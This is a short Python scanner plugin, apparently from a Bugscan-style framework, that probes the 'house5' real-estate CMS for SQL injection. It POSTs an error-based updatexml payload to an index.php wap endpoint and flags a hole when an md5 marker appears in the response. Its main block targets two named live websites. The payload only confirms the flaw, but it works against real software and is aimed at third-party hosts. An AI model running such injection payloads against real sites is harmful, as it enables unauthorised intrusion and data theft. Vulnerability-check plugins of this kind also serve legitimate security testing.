#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:house5房产系统SQL注射影响大量网站
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0126625


def assign(service,arg):
    if service=="house5":
        return True,arg 
   
def  audit(arg):
    
    url=arg+"index.php?s=wap/index/tools&t=maplist&catid=1"
    post="allid=1,2,5,(updatexml(1,concat(0x5e24,(select%20md5(123)),0x5e24),1))"
    code,head,res,errcode,finalurl=curl.curl2(url,post)
    
    if code==200 and  "202cb962ac59075b964b07152d234b"  in res:
        security_hole('postSQL injection: '+url)
        

if __name__=="__main__":
    from dummy import *
    audit(assign('house5','http://www.ahgoufang.com/')[1])
    audit(assign('house5','http://www.fangqz.com/')[1])
     

